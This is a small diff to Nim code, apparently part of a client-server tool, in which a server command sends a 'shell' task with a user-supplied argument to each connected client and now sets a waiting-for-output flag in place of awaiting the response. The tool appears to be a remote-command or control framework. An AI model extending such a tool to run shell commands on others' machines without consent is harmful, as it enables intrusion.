@@ -17,7 +17,9 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   
   for client in server.cli.handlingClient:
     let task = await client.sendClientTask("shell", %*[ args[0] ])
-    if not task.isNil(): await task.awaitResponse()
+    if not task.isNil(): 
+      server.cli.waitingForOutput = true
+      # await task.awaitResponse()
 
 let cmd*: Command = Command(
   execProc: execProc,
